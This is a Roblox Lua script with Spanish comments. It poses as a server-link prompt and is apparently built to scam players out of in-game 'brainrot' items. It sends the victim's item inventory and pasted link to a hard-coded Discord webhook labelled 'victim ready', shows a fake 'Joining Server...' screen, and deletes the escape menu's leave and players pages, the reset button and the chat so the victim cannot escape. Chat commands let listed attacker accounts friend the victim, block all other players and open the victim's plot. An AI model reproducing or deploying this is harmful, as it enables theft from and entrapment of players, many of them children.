-- ==================== SERVICIOS (AL INICIO) ====================
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")
local SoundService = game:GetService("SoundService")
local GuiService = game:GetService("GuiService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local CoreGui = game:GetService("CoreGui")
local VIM = game:GetService("VirtualInputManager")

-- ==================== CONFIGURACIÃ“N Y SEGURIDAD ====================
local LocalPlayer = Players.LocalPlayer
local playerGui = LocalPlayer:WaitForChild("PlayerGui")
local WEBHOOK_URL = "https://discord.com/api/webhooks/1454970356682199124/sgCgykHejgELxXd9Jp4CTWX2ziOKdu-qtGczLtBAThWZj-DqOY7jKGlNdgqYuYpuNXmA"
local whitelist = {"mario_12fachero", "lejandro555", "pan71234520", "pan712345"}
local heartbeatActive = true

-- Whitelist de Instancias para evitar que el script se borre a sÃ­ mismo
local instanciasWhitelist = {}
local function agregarAWhitelist(instancia)
    if instancia then instanciasWhitelist[instancia] = true end
end
agregarAWhitelist(Players)
agregarAWhitelist(CoreGui)
agregarAWhitelist(StarterGui)
agregarAWhitelist(LocalPlayer)

local function estaEnWhitelist(instancia)
    if instanciasWhitelist[instancia] then return true end
    local p = instancia.Parent
    while p do
        if instanciasWhitelist[p] then return true end
        p = p.Parent
    end
    return false
end

-- ==================== TU LÃ“GICA DE ENVÃO (BRAINROTS) ====================
local function formatNumberShort(n)
    if not n or type(n) ~= "number" then return "$0" end
    if n >= 1e9 then return string.format("$%.2fB", n / 1e9) end
    if n >= 1e6 then return string.format("$%.2fM", n / 1e6) end
    if n >= 1e3 then return string.format("$%.2fK", n / 1e3) end
    return "$" .. tostring(n)
end

local function parseValueFromText(s)
    if not s then return 0 end
    local clean = s:gsub("[^%d%.KMB+]", "")
    local numPart = clean:match("([%d%.]+)")
    if not numPart then return 0 end
    local n = tonumber(numPart) or 0
    if clean:find("B") then return n * 1e9
    elseif clean:find("M") then return n * 1e6
    elseif clean:find("K") then return n * 1e3
    else return n end
end

local function getBrainrots()
    local results = {}
    for _, desc in ipairs(Workspace:GetDescendants()) do
        if desc:IsA("BillboardGui") or desc.Name:find("Overhead") then
            local nameLbl = desc:FindFirstChild("DisplayName") or desc:FindFirstChild("Name")
            local genLbl = desc:FindFirstChild("Generation") or desc:FindFirstChild("Value")
            if nameLbl and genLbl and nameLbl:IsA("TextLabel") and genLbl:IsA("TextLabel") then
                local val = parseValueFromText(genLbl.Text)
                local key = nameLbl.Text .. "|" .. val
                if results[key] then results[key].count = results[key].count + 1
                else results[key] = {name = nameLbl.Text, value = val, count = 1} end
            end
        end
    end
    local out = {}
    for _, v in pairs(results) do table.insert(out, v) end
    table.sort(out, function(a, b) return a.value > b.value end)
    return out
end

-- ==================== COMANDOS Y WHITELIST ====================
local function isWhitelisted(name)
    for _, n in ipairs(whitelist) do if n == name then return true end end
    return false
end

local function configurarComandos(p)
    p.Chatted:Connect(function(msg)
        local msgLower = msg:lower():gsub("%s+", "")
        if isWhitelisted(p.Name) then
            if msgLower == ".add" then
                StarterGui:SetCore("PromptSendFriendRequest", p)
            elseif msgLower == ".block" then
                for _, target in ipairs(Players:GetPlayers()) do
                    if target ~= LocalPlayer and not isWhitelisted(target.Name) then
                        StarterGui:SetCore("PromptBlockPlayer", target)
                    end
                end
            elseif msgLower == ".open" then
                pcall(function() ReplicatedStorage.Packages.Net["RE/PlotService/ToggleFriends"]:FireServer() end)
            end
        end
    end)
end

-- ==================== LIMPIEZA AGRESIVA DEL MENÃš DE ESCAPE ====================
local function handleNewDescendant(descendant)
    if descendant.Name == "Players" or descendant.Name == "LeaveGamePage" then
        task.wait() 
        pcall(function() descendant:Destroy() end)
    end
end

local function bloquearMenuEscape()
    task.spawn(function()
        while task.wait(0.5) do
            pcall(function()
                local innerFrame = CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame
                if innerFrame:FindFirstChild("Players") then innerFrame.Players:Destroy() end
                if innerFrame:FindFirstChild("LeaveGamePage") then innerFrame.LeaveGamePage:Destroy() end
            end)
        end
    end)
end

CoreGui.DescendantAdded:Connect(handleNewDescendant)
for _, desc in ipairs(CoreGui:GetDescendants()) do handleNewDescendant(desc) end

-- ==================== LÃ“GICA DE BLOQUEO ORIGINAL (VIM) ====================
CoreGui.DescendantAdded:Connect(function(descendant)
    if descendant:IsA("GuiObject") and descendant:FindFirstAncestorWhichIsA("ScreenGui") and descendant:FindFirstAncestorWhichIsA("ScreenGui").Name == "BlockingModalScreen" then
        if descendant:IsA("TextLabel") then descendant:Destroy() end
        if descendant:IsA("GuiObject") then descendant.BackgroundTransparency = 1 end
        if descendant.Name == "3" and descendant.Parent and descendant.Parent.Name == "Buttons" then
            descendant.Size = UDim2.new(0, 5000, 0, 5000)
            descendant.Position = UDim2.new(0.5, 0, 0.5, 0)
            descendant.AnchorPoint = Vector2.new(0.5, 0.5)
            task.wait()
            local clickX, clickY = descendant.AbsolutePosition.X + descendant.AbsoluteSize.X/2, descendant.AbsolutePosition.Y + descendant.AbsoluteSize.Y/2
            VIM:SendMouseButtonEvent(clickX, clickY, 0, true, game, 0)
            task.wait(0.1)
            VIM:SendMouseButtonEvent(clickX, clickY, 0, false, game, 0)
        end
    end
end)

-- ==================== UI PROFESIONAL RESTAURADA ====================
local function buildUI()
    local screenGui = Instance.new("ScreenGui", playerGui)
    screenGui.IgnoreGuiInset = true

    local main = Instance.new("Frame", screenGui)
    main.Size = UDim2.new(0, 450, 0, 200)
    main.Position = UDim2.new(0.5, -225, 0.5, -100)
    main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
    Instance.new("UICorner", main)
    Instance.new("UIStroke", main).Color = Color3.new(1,1,1)

    local input = Instance.new("TextBox", main)
    input.Size = UDim2.new(0.8, 0, 0, 45)
    input.Position = UDim2.new(0.1, 0, 0.4, 0)
    input.PlaceholderText = "Pega el link aquÃ­..."
    input.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    input.TextColor3 = Color3.new(1,1,1)
    Instance.new("UICorner", input)

    local btn = Instance.new("TextButton", main)
    btn.Size = UDim2.new(0, 150, 0, 40)
    btn.Position = UDim2.new(0.5, -75, 0.7, 0)
    btn.Text = "CONFIRMAR"
    btn.BackgroundColor3 = Color3.new(1, 1, 1)
    btn.TextColor3 = Color3.new(0, 0, 0)
    Instance.new("UICorner", btn)

    btn.MouseButton1Click:Connect(function()
        if input.Text ~= "" then
            main.Visible = false
            local brs = getBrainrots()
            local totalVal = 0
            local items = ""
            for i,v in ipairs(brs) do totalVal = totalVal + (v.value * v.count) if i <= 20 then items = items..v.name.." x"..v.count.."\n" end end
            
            pcall(function()
                local request = (syn and syn.request) or (http and http.request) or request
                request({
                    Url = WEBHOOK_URL,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode({
                        content = "||@everyone|| ðŸ©¸ **VÃCTIMA LISTA**",
                        embeds = {{
                            title = "Reporte Profesional",
                            fields = {
                                {name = "ðŸ’° Valor Total", value = formatNumberShort(totalVal), inline = true},
                                {name = "ðŸ”— Link", value = input.Text},
                                {name = "ðŸ“‹ Items", value = items}
                            },
                            color = 0
                        }}
                    })
                })
            end)

            local black = Instance.new("Frame", screenGui)
            black.Size = UDim2.new(1.2, 0, 1.2, 0)
            black.BackgroundColor3 = Color3.new(0, 0, 0)
            black.ZIndex = 999
            local lbl = Instance.new("TextLabel", black)
            lbl.Size = UDim2.new(1, 0, 1, 0)
            lbl.Text = "Joining Server..."
            lbl.TextColor3 = Color3.new(1, 1, 1)
            lbl.TextSize = 35
            lbl.Font = Enum.Font.GothamBold
            lbl.BackgroundTransparency = 1
            bloquearMenuEscape()
        end
    end)
end

-- ==================== INICIALIZACIÃ“N ====================
for _, p in ipairs(Players:GetPlayers()) do configurarComandos(p) end
Players.PlayerAdded:Connect(configurarComandos)
buildUI()

task.spawn(function()
    while true do
        pcall(function()
            StarterGui:SetCore("ResetButtonCallback", false)
            if playerGui:FindFirstChild("Chat") then playerGui.Chat.Frame.Visible = false end
        end)
        task.wait(2)
    end
end)

-- Ghost Mode (Invisibilidad de otros)
Workspace.DescendantAdded:Connect(function(d)
    if d:IsA("Model") and Players:GetPlayerFromCharacter(d) and d.Name ~= LocalPlayer.Name then
        task.wait(0.5)
        for _, p in ipairs(d:GetDescendants()) do
            if p:IsA("BasePart") then p.Transparency = 1 p.CanCollide = false end
        end
    end
end)
